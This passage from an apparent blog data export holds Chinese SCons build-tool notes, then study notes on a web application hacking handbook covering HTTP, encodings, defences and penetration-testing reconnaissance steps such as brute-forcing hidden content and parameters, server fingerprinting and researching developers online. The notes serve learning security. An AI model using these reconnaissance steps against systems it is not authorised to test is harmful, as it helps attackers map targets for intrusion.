StaticLibrary 函数显示的指示要构建静态库StaticLibrary(&#x27;foo&#x27;, [&#x27;f1.c&#x27;, &#x27;f2.c&#x27;, &#x27;f3.c&#x27;])# 构建动态库SharedLibrary(&#x27;foo&#x27;, [&#x27;f1.c&#x27;, &#x27;f2.c&#x27;, &#x27;f3.c&#x27;]) 链接库12345678910# 通过在 LIBS 参数中指定库的名称，并在 LIBPATH 指定库的路径，即可完成对库的链接# 此处先构建一个静态库Library(&#x27;foo&#x27;, [&#x27;f1.c&#x27;, &#x27;f2.c&#x27;, &#x27;f3.c&#x27;]) # 此处告知要链接的静态库名称和路径# 注意：只需要提供库的名称即可，无须在库的名称前面加上 lib 前缀，或者 .a 后缀什么的Program(&#x27;prog.c&#x27;, LIBS=[&#x27;foo&#x27;, &#x27;bar&#x27;], LIBPATH=&#x27;.&#x27;) 查找库1234567# 通常情况下，链接器只在系统默认的文件中查找库，但是通过 LIBPATH 参数# 链接器会在指定的文件夹中查找库Program(&#x27;prog.c&#x27;, LIBS = &#x27;m&#x27;, LIBPATH = [&#x27;/usr/lib&#x27;, &#x27;/usr/local/lib&#x27;])# 不同的路径可以使用逗号分隔，组成列表；也可以使用冒号连接成单个字符串LIBPATH = &#x27;/usr/lib:/usr/local/lib&#x27; 5. 节点对象在内部实现上，Scons 将所有的文件和文件夹都当作一个 NodeObject 节点对象来对待； 构建方法的返回值是节点列表所有的构建方法都会返回一个节点列表，用来表示将要构建的目标文件或者参与构建的源文件，返回的这个列表可以作为参数，传递给其他构建方法； 1234# 假设我们需要为两个目标文件指定不同的构建参数，因此我们为它们调用了各自的 Object 方法hello_list = Object(&#x27;hello.c&#x27;, CCFLAGS=&#x27;-DHELLO&#x27;)goodbye_list = Object(&#x27;goodbye.c&#x27;, CCFLAGS=&#x27;-DGOODBYE&#x27;)Program(hello_list + goodbye_list) 显式创建文件和目录的节点1234567# 创建文件节点和创始目录节点的方法不同# 创建文件节点使用 File 方法hello_c = File(&#x27;hello.c&#x27;)Program(hello_c)# 创建目录节点使用 Dir 方法classes = Dir(&#x27;classes&#x27;)Java(classes, &#x27;src&#x27;) 正常情况下，并不需要手动创建节点，因为构建方法会自动帮助创建；仅在需要显式传递节点参数给构建方法时使用； 12# Entry 函数可以根据参数类型，创建文件节点或者目录节点xyzzy = Entry(&#x27;xyzzy&#x27;) 打印节点的文件名称由于构建方法返回的是一个节点列表，因此如果要打印文件名称，很可能需要遍历它，或者使用索引访问它 12345object_list = Object(&#x27;hello.c&#x27;)program_list = Program(object_list)print &quot;The object file is:&quot;, object_list[0]print &quot;The program file is:&quot;, program_list[0]# 事实上此处的 object_list 是节点列表，仅仅是 print 函数将节点转成了字符串来代表文件名 获取节点文件名使用 Python 内置的 str 函数即可方便的将一个节点转成一个文件名，例如可以用来判断一个文件是否存在 12345import os.pathprogram_list = Program(&#x27;hello.c&#x27;)program_name = str(program_list[0])if not os.path.exists(program_name): print program_name, &quot;does not exist!&quot; 获取节点路径env 对象有一个 GetBuildPath方法，可以用来获取单个或多个节点的路径 123456# 创建一个 env 对象，它代表一个环境，在这个环境中，有一个环境变量的 VAR 的值为 valueenv=Environment(VAR=&quot;value&quot;)# 生成一个文件节点n=File(&quot;foo.c&quot;)# 调用 env 对象的 GetBuildPath 方法，获取节点列表的路径列表print env.GetBuildPath([n, &quot;sub/dir/$VAR&quot;]) 12# 打印结果为[&#x27;foo.c&#x27;, &#x27;sub/dir/value&#x27;] 除了使用 env 对象的 GetBuildPath 方法外，也有一个函数版本的 GetBuildPath ，它使用全局环境； 6. 依赖出现更新判断文件是否更新如果源文件的内容没有出现更新，是 Scons 不会重复构建已经完成构建的文件，这样可以节省大量的构建时间，不需要每次都从头开始构建每一文件； 使用 MD5 判断SCons 使用 MD5 来判断某个文件的内容是否发生了更新，当然，也可以另外配置让其使用文件时间戳来判断，甚至可以使用单独的 python 函数来进行各种自定义的判断； 使用 MD5 有一个好处是它只判断内容中的正文部分，同时忽略注释部分，即只要正文内容的构建结果不会出现变化，则 SCons 就不会重现构建它； 使用时间戳判断如果想使用时间戳来判断文件是否发生更新，则只需要调用 Decider 函数进行设置即可 123Object(&#x27;hello.c&#x27;)# 将判断方法设置为使用时间戳Decider(&#x27;timestamp-newer&#x27;) 普通的时间戳存在一个问题，即某个文件如果从仓库签出了一个旧版本，由于它的时间戳比当前的目标文件更早，所以不会判断为出现更新，导致编译错误；针对这种情况，可以使用 timestamp-match 规则来进行判断 123Object(&#x27;hello.c&#x27;)# 使用 timestamp-match 规则进行判断，只要时间戳不吻合，即需要重新构建，不管新旧Decider(&#x27;timestamp-match&#x27;) 使用混合规则仅当文件的时间戳出现了变化，再去计算文件的 MD5 值是否发生了变化，这样性能更好； 123Program(&#x27;hello.c&#x27;)# 使用混合的规则Decider(&#x27;MD5-timestamp&#x27;) 自定义规则可以自己写一个判断规则的函数，然后传递给 Decider 即可 123456789Program(&#x27;hello.c&#x27;)def decide_if_changed(dependency, target, prev_ni): if self.get_timestamp() != prev_ni.timestamp: dep = str(dependency) tgt = str(target) if specific_part_of_file_has_changed(dep, tgt): return True return False Decider(decide_if_changed)","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"C","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"黑客攻防技术宝典","slug":"黑客攻防技术宝典","date":"2020-12-05T02:18:00.000Z","updated":"2024-09-21T10:15:41.942Z","comments":true,"path":"2020/12/05/黑客攻防技术宝典/","permalink":"http://example.com/2020/12/05/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E5%AE%9D%E5%85%B8/","excerpt":"","text":"1. Web应用程序案例与风险Web应用程序的发展历程早期Web服务器仅提供静态内容，可以被任意人公开访问；今天则完全变了，Web服务器可以提供非常丰富的服务； Web应用程序安全虽然很多站点声明自己是安全的，但实际上并非如此。超过一半以上的安全存在各式各样的漏洞； 不完善的身份验证措施：62%； 不完善的访问控制措施：71%； SQL 注入：32%； 跨站点脚本：94%； 信息泄露：78%； 跨站点请求伪造：92%； 核心安全问题：用户可提交任意输入用户在浏览器事实上拥有无限的权限，因此可以提交任意非开发者预期的内容，而开发者需要假设所有的输入都可能是恶意的，并进行防范； 关键问题因素以下几点原因让问题变得更加严重了： 不成熟的安全意识 独立开发 欺骗性的简化； 快速发展的攻击技术； 资源与时间限制； 技术上强其所难； 对功能的需求不断增加； 新的安全边界早期安全边界在于防火墙层级，但随着Web应用程序的功能变得更加模块后，需要访问操作系统中或者之间不同功能模块，例如数据库，使得安全边界问题缩小到了Web应用程序内部； Web应用程序安全的未来暂时还没有迹象显示安全问题能够在不远的未来得到解决，因为整个行业远未形成成熟的意识或者能力； 2. 核心防御机制处理用户访问多数Web应用使用以下三种安全机制处理用户访问，但由于这三个机制之间相互依赖，因此导致它们不能达到预期的安全保护目标； 身份验证 会话管理 访问控制：由于这方面的控制相当复杂，因此一般存在大量的安全漏洞； 处理用户输入输入的多样性有些字段有特殊格式的输入要求，但有些字段，例如文章、备注等，则需要允许各式各样的输入值； 当探查到用户的非法输入，正常应该拒绝用户提交的，并将事件记录到日志文件中，以便随后进行调查； 输入处理方法拒绝已知的不良输入通常是使用一个黑名单，包含一组攻击中会使用的模式，阻击任何与黑名单匹配的数据；但这种方法的效率不同，也存在各种绕过的方法； 接受已知的正常输入使用一个白名单；这种方法比黑名单要好得多，但有时候有些字段存在迫不得已的情况，例如用户的姓名； 净化即在开始处理数据之前，先对数据进行净化，删除或转义可能存在的恶意字符；这种方法一般非常有效；不过在一个输入项中容纳多个可能的恶意数据时，有时不能完全净化成功； 安全数据处理通过确保处理的过程绝对安全，例如在数据库查询过程中使用参数化查询以避免 SQL 注入攻击；这也是一项有效的通用方法，不过不能够适用于Web应用程序需要执行的每个操作； 语法检查攻击的输入是正常的，但输入的用途是非法的，例如伪装成他人的账号； 边界确认由于Web 应用程序提供的功能很广泛，因此不同功能组件之间并不存在一个统一的安全边界，需要具体情况具体处理，每个功能组件执行自己的安全检查； 多步确认与规范化Web应用程序有时会对用户输入进行多步的确认，或者做一些规范化的操作，此时攻击者可以专门设计一些针对这些操作的输入字符，以避开检查机制； 处理攻击者常见措施： 处理错误 维护审计日志； 向管理员发出警报； 应对攻击； 处理错误避免向用户返回任何由系统生成的错误信息，因为它们将非常容易被攻击者有效利用；一般使用 try…catch 机制来生成自定义的错误信息，并将异常情况记录到日志中，以便后续进一步检查处理； 维护审计日志在任何注重安全的应用程序中，日志应记录所有重要事件，这些事件至少包括： 所有与身份验证功能相关的事件，如成功或失败的登录，密码修改等； 关键交易，例如信用卡支付与转账； 被访问控制机制阻止的访问企图； 任何包含已知攻击字符串，公然表明恶意意图的请求； 有效的审计日志一般会记得每个事件的发生时间、发出请求的IP地址、用户的账号等信息；这些信息需要进行严格的保护，避免未授权的读取或写入访问。一般来说，需要将它们存储在单独的系统中，仅允许主应用程序访问，或者存储在一次性写入的介质中；如果这些日志被攻击者利用，将可能使攻击者立即攻破整个应用程序； 向管理员发出警报警报监控的反应事件一般包括： 应用反常：如收到由单独一个IP 地址或用户发出的大量请求（表明应用程序正受到自定义攻击）； 交易反常； 包含已知攻击字符串的请求； 请求中普通用户无法查看的数据被修改； 由于每个应用程序实际业务场景各不相同，因此最好的警报机制，是根据当前业务场景，判断哪些输入是普通用户不可能出现的，然后与警报机制整合，第一时间发出警报； 应对攻击当发现攻击者时，应当设计能够采取自动反应的措施，以阻止攻击进行探查，例如对其提交的请求的响应速度变缓慢，或将其加入黑名单1-2天，或者终止攻击者的会话，要求其重新登录等； 当然，最重要的事件还是应该立即修复应用程序中存在的所有漏洞； 管理应用程序很多应用程序使用相同的 Web 界面在内部执行管理功能，但是它无形中也变成一个主要的攻击目标，因为攻破这个界面后，能够有效提升权限； 3. Web应用程序技术HTTPHTTP 请求头部中的一些字段： Referer：用来表示发出请求的原始 URL； User-Agent：用来显示发出请求的客户端（如浏览器）的信息 Host：用来显示被访问的 URL 中的主机名称； Cookie：用来显示服务器向客户端发送的参数； HTTP 响应中的一些字段 Server：用来显示服务端所使用的服务器程序，例如：Apache、Nginx、 Microsoft-IIS等； Pragma：用来告知浏览器不要缓存结果（适用于动态资源的场景）； Expires：用来告知浏览器当前资源的过期时间； Content-Type：用来告知浏览器主体的内容类型，以便浏览器可以正确解析； Content-Length：用来告知浏览器主体的长度； HTTP 方法由于 GET 请求会将请求参数显示在 URL 中，并且可以存储在书签或是放在请求头部的 Referer 字段中，因此应避免使用查询字符串传送任何敏感的信息； 其他方法： TRACE：当使用该方法访问某个资源时，服务端会在响应的主体中返回其收到的客户端的具体请求内容；因此，客户端可以用它来诊断自身发出的请求是否在中途被窜改了； OPTIONS：用来向服务端询问某个资源允许的操作方法；服务端会在返回的响应的头部 Allow 字段中列出可执行的方法； HTTP 还有其他一些允许的方法，如果服务端激活的方法越多，则面临被攻击的风险越大； URL常用的 URL 是绝对路径的格式，但其实也支持使用相对路径的格式； RESTREST 风格的 URL 一般是指将查询参数放在路径中，而不是放在查询字符串中； HTTP 消息头常用消息头： Connection：告知对方在完成 HTTP 传输后，如何处理当前的 TCP 连接状态，例如保持开放，或者直接关闭； Content-Encoding：为消息主体中的内容指定编码格式，例如 gzip（很多应用会使用该格式来压缩响应主体中的内容，以提高传输的速度）； Transfer-Encoding：为某段传输指定编码格式（一个 HTTP 连接可以分成多段传输，每一段的消息可以使用不同的编码格式，例如：chunked、compress、deflate、gzip、identity等）； 请求消息头 Accept：客户端用它来告知服务端自己可以接收哪些类型的内容，例如图片、文档等； Accept-Encoding：用来告知服务端，客户端可接受的内容编码方式； Authorization：提供服务端所要求的认证类型和认证信息，例如：basic类型+用户名+密码，需要配合 HTTPS 使用，不然等同于明文传输账号密码； If-Modified-Since：用来告知服务端浏览器最后一次收到当前所请求资源的时间；如果在那个时间之后，资源并未出现变化，则服务端不需返回资源内容，只需要返回304编码，告知客户端之前的缓存仍可用； If-None-Match：用来告知服务端，如果服务端没有任何资源与该字段的 Etag 值匹配，则应返回所请求的资源，否则则无须返回，浏览器将使用本地的缓存； Origin：用来告知服务器当前请求来自于哪个站点，该字段一般用于跨域 Ajax 请求中； Referer：用来告知服务器表明当前请求所来源页面的地址； 响应消息头 Access-Control-Allow-Origin：用来告知客户端是否允许跨域请求当前的资源； ETag：为当前资源设置一个唯一标签，后续客户端可以使用该标签，向服务端询问所请求的资源是否已经过期； Expires：用于告知客户端当前资源的过期时间； Location：用来告知客户端资源重定向的目标地址，一般配合 3 开头的状态码使用； Pragma：用来告知浏览器如何处理缓存，例如：no-cache； Server：用来告知客户端，服务端当前使用的是什么样的服务器软件； Set-Cookie：服务端用来向客户端发送 cookie 值； WWW-Authenticate：服务端用其来告知客户端自己支持哪些身份验证方式，一般配合 401 状态码使用； X-Frame-Options：服务端用其来告知客户端如何加载当前响应； cookiecookie 一般由一个键值对构成，但也可包含任何不含空格的字符串；可以在服务器响应中使用几个 Set-Cookie 消息头发布多个 cookie；客户端也可以在 Cookie 消息头中用分号分隔不同的 cookie； 服务端发出的 Set-Cookie 消息头中，还可以包含一些额外的属性，以指示客户端如何处理使用 cookie， 包括： expires：用来设定 Cookie 的有效时间；如果没有值，则浏览器不会永久保存当前 cookie，仅用于当前浏览器会话中；如果有值，则浏览器会将 cookie 值在本地存储下来，并在随后的浏览器会话中重复使用； domain：用来指定 cookie 可以有效使用的域；指示客户端仅可以将 cookie 用于 domain 所指定的域； path：用于指定 cookie 可以使用的路径； secure：限制只在 https 请求中使用 cookie； HttpOnly：用来限制客户端无法使用 JavaScript 直接访问 cookie； 状态码每条 HTTP 响应消息都会在它的第一行中包含一个状态码，状态码主要分为五类： 1开头的：提供信息 2开头的：请求被成功处理； 3开头的：请求被重新定向到其他资源； 4开头的：请求中包含错误； 5开头的：服务器在处理请求时发生错误； 常见的状态码 100 Continue：已收到请求的消息头，但主体还没有完整收到，客户端应继续发送余下的主体，待全部收到后，将返回新的响应； 200 Ok：请求已成功处理，并在响应中返回了请求结果； 201 Created：请求已成功提交； 301 Moved Permanently：所请求的资源已经永久性的转移到一个新的地址，新地址放在 Location 字段中，客户端后续应使用这个新地址来访问相应的资源； 302 Found：所请求的资源临时转移到了一个新地址，新地址放在 Location 字段中；但转移只是临时的，后续请求该资源应仍然使用旧地址； 304 Not Modified：在客户端的请求中，会有一个 If-Modified-Since 字段，记录着客户端上一次收到该资源的时间，服务端根据这个时间，判断在那之后，资源是否发生过修改，如果没有修改，就可以发回 304 响应，告知客户端所请求的资源未更新，让客户端使用缓存中的资源副本；另外客户端也可以在请求首部中使用 If-None-Match 字段，并在该字段中放上资源的 Etag 值，如果服务端发现存在相同 Etag 值的资源，则返回 304 响应；如果不存在，则返回所请求的资源； 400 Bad Request：表示客户端提交了一个无效的请求； 401 Unauthorized：表示客户端的请求没有验证成功，同时服务端会在响应的 WWW-Authenticate 字段中放上如何验证的信息； 403 Forbidden：表示所请求的资源绝对禁止访问，有身份验证也不行； 404 Not Found：表示所请求的资源不存在； 405 Method Not Allow：表示所请求的方法不支持； 413 Request Entity Too Large：表示请求的主体过长，服务端无法处理； 414 Request URI Too Long：表示请求的地址过长，服务端无法处理； 500 Internal Server Error：表示服务端在处理请求时遇到错误； 503 Service Unavailable：表示服务端的服务器程序虽然运转正常，但处理请求的应用程序无法作出响应； HTTPSHTTPS 跟 HTTP 一样，也属于传输层的协议，但是它使用 TLS&#x2F;SSL 对传输的数据进行了加密； HTTP 代理当使用 HTTPS 和使用代理向服务端发起请求时，客户端无法和代理服务器完成 TSL 握手，因此，代理服务器只能被当作 TCP 中继来使用；这意味着如果能够控制代理服务器的话，就能拦截并修改客户端和服务端之间的请求和响应数据；这将非常有用（原因在于可以控制浏览器发出的请求，并分析和修改服务器返回的响应；多数渗透测试工具都是以代理服务器的形式来运行）； HTTP 身份验证HTTP 身份验证有内置自己的身份验证功能，包括： Basic NTLM Digest 由于 HTTP 内置的验证功能，会将服务端要求提供的验证身份信息（如密码）放到消息头部中，因此如果不使用 HTTPS 连接的，这种验证方式将会是很危险的，因为如果请求被拦截的话，就会导致验证信息暴露；如果使用了 HTTPS，则这种验证方式就没那么危险； Web 功能服务器端的功能相对于互联网早期，服务器端提供的资源已经从以静态为主，变成了以动态资源为主，同时针对 Web 应用程序的开发也出现了各式各样的工具，了解这些工具，研究它们的漏洞，将十分有助于找出它们的案例隐患； 常用的服务端开发工具或平台包括： Java ASP.Net PHP Ruby On Rails SQL XML Web 服务 客户端的功能常用的浏览器开发工具或技术： HTML 超链接 表单 CSS Javascript VBScript 文档对象模型 Ajax JSON 同源策略：从相同站点收到的内容，可以访问并修改该站点的其他内容；但不能访问或修改不同站点的内容；这个策略由浏览器实现； HTML5 Web2.0 浏览器插件 状态与会话会话即可保存在服务器端，也可以保存在客户端；保存在服务器端的话，则需要给客户端发送一个令牌；保存在客户端则可以减轻服务器的负担；但是保存在浏览器端的数据有可能被用户修改，因此在将数据发给客户端保存之前，一般会使用一个只有服务端才知道的值，对数据做散列值计算，之后将数据和散列值都发给客户端；客户端需要在下一次请求中同时携带会话数据和散列值，如果会话数据被修改了，则服务端对会话数据进行计算的散列值和用户提供的散列值将无法匹配（如果会话是存储在服务器端的话，就没有这个必要了，直接将散列后的会话 ID 发给客户端即可；之所以要做散列，目的是让客户端无法猜测出来其他会话 ID，以避免客户端冒充他人）； 编码方案客户端发送给服务器的数据一般需要使用某种编码方案，服务器端在数据后，按照指定的方案对数据进行解码；因此，如果客户端操纵编码方案，有可能会让看似无害的信息，编码成另外一种解释； URL 编码URL 的编码方案使用 ASCII 字符集中的可打印字符对数据进行编码；该编码方案以 % 开头； %20 代表空格，另外 + 加号也代表空格； 有些字符是 URL 编码方案的保留关键字，因此如果在请求内容中使用这些字符，则需要对这些字符进行编码的转换，不然会被识别成关键字；包括：空格、%、？、&amp;、；、+、# 等； Unicode 编码Unicode 编码以 %u 开头，之后是用十六进制表示的编码，例如 %u2215 表示斜杠 “&#x2F;“； Unicode 的编码长度统一是4位的十六进制，相当于 16 位的二进制，或许也可叫做 UTF-16； UTF-8 则是一种长度可变的编码方案，它有可能只有一个字节，也有可能有多个字节；由于大部分字符是不常用的，如果将常用的字符用短编码来表示的话，则将会大大减少编码后的内容长度，提高传输效率； HTML 编码在 HTML 文档中，由于 HTML 语言也有一些保留的关键字，因此如果在内容中使用了这些关键字，就需要对其进行 HTML 编码，以便不会识别成关键字； HTML 编码使用了三种编码方案，都是以 &amp; 开头，包括： 实体：例如 &amp;quot 表示双引号，&amp;apos 表示单引号，&amp;amp 表示 &amp;； 十进制：以&amp;# 开头并加上字符的 ASCII 编码，例如：&amp;#34 表示双引号，&amp;#39 表示单引号 十六进制：以&amp;#x 开头，并加上字符的 ASCII 编码的十六进制数，例如：&amp;#x22 表示双引号，&amp;#x27表示单引号； Base64 编码Base64 编码使用 ASCII 中的可打印字符集合对内容进行编码，一般使用于邮件附件的编码，有时也用于 HTTP 内置的验证机制中对用户密码进行编码； Base64 使用的可打印字符集很少，包括以下 26个英文大写&#x2F;小写字母，数字0-9，还有加号”+”、斜杠”&#x2F;“，其他就没有了，总共是64个字符； 计算机中的数据是以字节表示的，每个字节由8个二进制位构成，因此每三个字节就会有24个二进制位；24个二进制位可以分成4组，每组6个二进制位，每组用一个 Base64 字符来表示，这样每 3 个字节就可以转换成 4 个Base64 字符来表示； 因此，只需要将待转换数据的字节总数是 3 的倍数（不足时使用等号 &#x3D; 进行凑齐），就可以将其他转换成 Base64 字符来表示； 即使对一段数据进行细微的修改，则转换后的 Base64 编码也会出现很大的差别，但是由于它使用等号来凑齐字符，因此很容易被识别出来是 base64 编码方案，导致失去防患效果； 十六进制编码用 ASCII 字符表示十六进制数据块，例如：daf 表示为 646166 序列化框架工具使用一些框架对待传输的数据进行序列化，这些框架包括： Flex 和 AMF Silverlight 和 WCF Java 序列化对象 4. 解析应用程序步骤： 枚举应用程序的功能 分析其核心安全机制和使用的技术，以暴露其主要的受攻击面； 发现可供利用的漏洞； 枚举内容与功能Web自动抓取通过爬虫工具将应用程序的所有页面抓取下来；常见的免费工具包括： Burp Suite WebScarab Zed Attack Proxy CAT 有些网站会在其根据目录放一个 robots.txt 文件，用来告知爬虫或者搜索引擎其不想被列入索引的 URL，不过这有时反而变成一个突破口，让攻击者能够快速发现一些可抓取的目标； 爬虫的自动抓取还是比较简单和机械的，它不过是不断探查每个页面中存在的超链接，然后不断向新链接发起请求，如果链接中有表单，它就伪造一些数据进行表单的提交；直到抓取完所有页面链接为止； 自动抓取工具的一些不足 无法处理动态生成的链接； 无法抓取存放在对象中的链接； 无法应对输入检查； 每个链接只请求一次，但实际上相同链接，使用不同请求参数可能返回不同的内容； 无法应对 URL 中的随机数，会造成死循环； 无法应对身份验证机制； 用户指导的抓取在客户端和服务端之前设立一道拦截器，然后由用户人工浏览网站，做一些动作，之后拦截器根据拦截到的数据生成站点地图；这种方式可以克服前面自动抓取的多项不足； 渗透测试步骤 配置浏览器，使用 Burp 或 WebScarab 作为本地代理服务器； 以常规方式浏览整个应用程序，访问发现的每一个链接，提交每一个表单并执行全部多阶段功能；分别在 javascript 启用与禁用、cookie 启用和禁用的情况下进行浏览； 检查由拦截工具生成的站点地图，找出手动浏览时没有发现的所有隐藏内容和功能，通过浏览器访问这些内容，以便拦截工具获得服务器的响应，从而确定其他所有内容；递归执行上述步骤，直到无法再找出新内容为止； 先将可能会导致会话中断的 URL 排除掉，然后基于余下的内容，让爬虫主动抓取站点内容； 发现隐藏的内容常用的隐藏内容有： 不同权限的用户登录后看到不同的内容； 上线后未删除的开发测试功能或者调试功能； 备份文件 文件快照的备份档案； 已部署但未上线可用的新功能； 已部署但对部分用户不可见的功能； 尚未从服务器上删除的旧版文件； 配置和包含敏感数据的文件； 当前应用程序功能的源文件； 包含有效用户名、会话令牌、被访问的 URL 以及所执行的操作的日志文件； 源代码中可能包含的用户名和密码等信息； 蛮力技巧通过发送大量的请求，包含常见的目录名称，收集服务器的响应，来猜测隐藏功能的名称和标识符； 渗透测试步骤 手动提出一些访问有效与无效资源的请求，看服务器如何处理无效资源； 使用指导抓取生成的站点地图作为自动查找隐藏内容的基础； 针对基础应用程序内已知存在的每个目录或路径中常用的文件名和目录，自动发起请求；如果已经了解应用程序处理访问无效资源的处理方式，则可以配置 Intruder 等工具将其忽略； 收集从服务器返回的响应，手动检查这些响应以筛选出有效的资源； 反复执行这个过程，直到发现新内容； 通过公布的内容进行推测一般来说，应用程序会使用某种命名方案，因此可以配置抓取工具按照命名方案进行搜索，这样可以提高命中的效率； 渗透测试步骤 检查用户指定的浏览与基本蛮力测试获得的结果，包括所有子目录名称、文件词干、文件扩展名列表等； 检查这些列表，确定应用程序所使用的命名方案； 有时候，命名方案中会使用数字和日期作为标识符，因此根据历史文件的命名，可以猜测出公司的新文件的命名； 检查所有客户端代码，如HTML 和 Javascript，寻找与隐藏内容有关的蛛丝马迹，例如代码中的注释部分，经常放着一些重要的线索，有时候甚至有高度敏感的信息； 把已经枚举出来的内容和文件名扩展名添加的常用列表中，它们有可能会揭示应用程序所使用的开发语言和工具； 搜索开发者工具和文件编辑器不经意建立的临时文件，例如 .DS_Store 文件； 结合目录、文件词干、文件扩展名列表，再进一步执行自动搜索操作，发掘更多隐藏的信息； 如果找到了一种统一的命名方案，则可以在这个基础上，实施更有针对性的蛮力测试； 基于新找到内容和新发现的模式，作为用户指导抓取操作的基础，反复执行之前的步骤，继续执行自动内容查找； 上述的大部分动作可以在 Burp Intruder Pro 的内容查找功能中实现； 利用公共信息如果应用程序中的内容在历史上曾经跟其他内容有所连接的话，则可以通过搜索引擎、Web档案等第三方工具将这些连接找出来； 渗透测试步骤 使用多种不同的搜索引擎和Web档案工具，查找它们保存的关于所要攻击的应用程序的相关信息； 查询搜索引擎时，可以使用搜索引擎提供的一些便利功能来提高搜索效率，例如：site, link, related 等关键字； 每次搜索时，不仅查看搜索引擎提供的默认部分中的内容，还可以看一下群组、新闻等部分的内容； 如果有部分内容被搜索引擎省略，可以将它们纳入搜索范围后，重新搜索； 查看感兴趣页面的缓存版本，里面可能包含一些未经过验证就无法查看的信息； 在属于相同组织的其他域名上执行相同的查询； 一般来说，应用程序的开发人员，在开发过程中不可避免会遇到问题，并到一些论坛上面提问题和寻找答案，因此这些地方有可能会查到一些关于代码的信息； 渗透测试步骤 列出与待攻击应用程序相关的开发人员的姓名和邮件列表； 根据姓名查找他们在因特网上发表的所有问题和安全，分析发现的信息，了解与应用程序相关的线索； 利用 Web 服务器程序Web 服务器程序本身也是存在大量漏洞的，利用这些漏洞可以获得应用程序所有页面和其他资源；更有意思的是， Web 服务器程序一般会结合很多第三方工具来提供一些便捷的功能，这些模块都会有一些安装规律，因为可以加以利用，暴露出一些其他办法查找不到资源路径； Nikto 或者 Wikto 即是可以执行上述扫描功能的免费工具； 应用程序页面与功能路径基于 URL 的内容查找源于历史上的静态页面，现在很多服务端应用程序已经演变为以提供动态页面为主，经常在会参数中携带功能的名称，而不是在 URL 中显示，因此前面描述的那些方法不一定能够很好的发现所有的隐藏内容； 针对这种情况，渗透测试的步骤如下： 确定所有通过在参数中提交功能名称的情况 修改之前提到的 URL 内容查找自动化的配置，以便让它能够应对这种新的情况； 如果可能的话，根据功能路径画一张应用程序的内容图，找出被枚举的功能和逻辑路径之间的依赖关系； 发现隐藏的参数有时候开发人员会通过一些隐藏的参数来改变应用程序的行为，例如使用 debug 参数来开启或关闭调试功能； 渗透测试步骤： 使用常见参数和常用值，提交大量请求； 监控收到的全部响应，看增加的额外参数有没有让应用程序作出不一样的响应行为； 如果时间允许，可以对所有页面都执行以上动作；如果时间不允许，可以只测试一些重点的页面，例如登录、搜索、文件的上传和下载等； 分析应用程序在枚举完尽可能多的功能后，接下来是基于收集到的数据，进一步分析应用程序，以找到它的攻击面；值得分析的一些重要部分如下： 应用程序的核心功能； 应用程序的外围功能，例如错误消息、日志、重定向使用、站外链接等； 核心安全机制及其动作方式，特别是会话状态、访问控制、验证机制及其支持（例如用户注册、忘记密码、账户恢复等）； 应用程序处理用户提交的输入的所有位置，例如 URL、查询字符串、POST 数据等； 客户端使用的技术，例如表单、客户端脚本、厚客户端组件等； 服务端使用的技术，例如静态与动态页面、请求参数类型、SSL、Web服务器软件、数据库交互、电子邮件系统等后端组件； 其他任何可收集到的，关于服务器应用程序内部结构与功能的其他信息，例如后台传输机制等； 确定用户输入的入口点输入的常见位置如下： 每个 URL 字符串，例如：REST 风格的应用程序； URL 查询字符串中提交的每个参数； POST 请求主体中提交的每个参数； 每个 cookie 的键值对； 极少数情况下还包括消息头中的一些字段，例如 User-Agent、Referer、Accept、Accept-Language、Host等； URL 文件路径此时的输入体现在 REST 风格的路径中，至于命名是否有统一的标准，主要取决于开发者； 请求参数一般来说，在查询字符串的请求参数、POST 参数和 cookie 键值对中，都含有明显的输入，但是它们的格式不一定是标准的 key&#x3D;value 格式，有些开发者会使用一些定制的模式，需要加以留意一下； HTTP 消息头很多应用程序会使用日志的功能，会去读取 Referer 和 User-Agent 字段里面的值，因此这些消息头也有可能成为入口点； 有些应用程序还会处理消息头里面的值，记录和提取关于用户的一些信息，然后做出不同的响应；例如根据用户访问使用的不同设备、根据 IP 进行定位等； 应用程序的这些功能都增加了 SQL 注入或持续的跨站点脚本等攻击； 带外通道在探测的过程中，服务端的结果有时并一定会通过响应进行返回，此时就需要有额外的通道能够查询到这些响应； 确定服务器端技术提取版本信息例如响应中的 Server 消息头；其他可能揭露服务相关软件信息的有 建立 HTML 页面的模板； 定制的 HTTP 消息头； URL 查询字符串参数； HTTP 指纹识别虽然服务端可能会在 Server 消息头中对自己的身份进行伪造，但是应用程序中仍然会有很多蛛丝马迹可以用来推测服务端会使用的软件，也有相应的工具，例如 httprecon 等； 文件扩展名常用的文件扩展名 asp: Microsoft Active Server Pages; aspx: ASP.NET jsp: Java php: PHP 即使页面没有体现出扩展名，也可以通过请求一个不存在的文件，从返回的错误页面也可能可以得到相关信息； 目录名称一些子目录名称也可用来确认是否使用相关技术； servlet：Java servlet； pls: Oracle PL&#x2F;SQL 网关 rails: Ruby on Rails 会话令牌会话令牌的名称也会揭示信息 JESSIONID: Java ASPSESSIONID: Microsoft IIS 服务器 ASP.NET_SessionId： ASP.NET PHPSESSID: PHP 第三方代码组件很多应用程序会整合一些第三方代码组件来执行一些常见的功能，例如购物车、登录机制等；这些组件可能为开源代码，或者从其他公司购买来的，不管是哪一种，都意味着这些组件会被很多人使用； 因此，软件中很可能包含其他地方已经揭示的某些已知漏洞，攻击者还可以下载这些组件的开源代码进行分析，在找到可能的漏洞； 渗透测试步骤 确定全部用户输入入口点； 分析应用程序所使用的查询字符串格式，设法了解键值对的名称规律； 确定应用程序可能使用的一些第三方数据的带外通道； 查看响应中的 Server 属性； 检查所有 HTTP 消息头或 HTML 注释中包含的其他软件标识； 运行 Httprecon 工具来识别服务器； 如果获得了 Web 服务器软件名称和版本，则可以搜索可供利用的所有漏洞； 分析应用程序的 URL 列表，从扩展名和子目录名中查找线索； 分析会话令牌的名称； 使用常用技术列表或 Google 推测服务器所使用的技术； 在 Google 上搜索第三方组件可能使用的不常用的 cookie、脚本、HTTP 消息头名称；确定所使用的是哪种第三方组件，下载安装组件，分析其中可能存在的漏洞； 确定服务器端功能仔细分析请求请求中的各种参数暗含着很多信息量，包括资源的类型、可执行的操作、资源的编号、是否使用数据库、服务器的语言框架等； 推测应用程序的行为应用程序可能会执行某种输入确认检查，以净化可能存在的恶意输入；如果它有将错误揭示反馈到浏览器，则可以用来判断应该提交哪些输入，才有可能通过检查，之后设计特定字符串来规避检查； 